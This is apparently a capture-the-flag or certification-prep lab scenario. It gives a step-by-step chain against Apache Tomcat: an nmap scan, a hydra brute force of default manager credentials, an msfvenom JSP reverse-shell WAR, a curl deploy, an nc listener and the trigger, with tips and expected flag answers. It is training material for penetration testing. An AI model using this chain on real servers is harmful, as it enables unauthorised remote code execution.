# Scenario 07 — Tomcat Default Creds to WAR Reverse Shell

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 02 Scanning, 11 Web Servers, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), [hydra](../../tools/hydra.md), [msfvenom](../../tools/msfvenom.md), [metasploit](../../tools/metasploit.md)

## Story
Target `10.10.10.66:8080` serves Apache Tomcat. Get a shell on the box.

## Step 1 — Scan
```bash
nmap -sV -p- -T4 10.10.10.66
```
**Expected finding:** 8080/http Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 9.0.x).

## Step 2 — Hit the manager page
Browse to `http://10.10.10.66:8080/manager/html`. Cancel the basic-auth prompt, note version on the default page.

## Step 3 — Brute default creds
```bash
hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
      -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt \
      -f 10.10.10.66 -s 8080 http-get /manager/html
```
**Expected finding:** `tomcat:s3cret` or `admin:admin`.
**→ Tool ref:** [hydra http-get](../../tools/hydra.md)

## Step 4 — Build a WAR payload
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war
```
**→ Tool ref:** [msfvenom](../../tools/msfvenom.md)

## Step 5 — Deploy + trigger
```bash
# Upload
curl -u tomcat:s3cret --upload-file shell.war \
     "http://10.10.10.66:8080/manager/text/deploy?path=/shell"
# Listen
nc -lvnp 4444 &
# Trigger
curl http://10.10.10.66:8080/shell/
```
**Expected finding:** reverse shell as `tomcat` user.

## Step 6 — Final answer
```bash
cat /opt/tomcat/flag.txt   # or wherever the Q points
```
**Answer format:** flag string or username of the shell (`whoami`).

## Gotchas across this chain
- Tomcat 9 moved the deploy endpoint to `/manager/text/` — `/manager/html/upload` is Tomcat 7 only.
- Must authenticate as a user with `manager-script` role — `manager-gui` alone cannot upload via text API.
- msf has `exploit/multi/http/tomcat_mgr_upload` which one-shots steps 4–5.
- Default cred lists live in `/usr/share/metasploit-framework/data/wordlists/` on Kali.
- If deploy returns `FAIL`, the app name is already taken — change `path=/shell2`.

## Variant questions this scenario teaches you to handle
- "What version of Tomcat is running?" → step 1/2.
- "Brute force the manager creds" → step 3.
- "Craft a WAR reverse shell" → step 4.
- "Get RCE on the Tomcat server" → full chain.
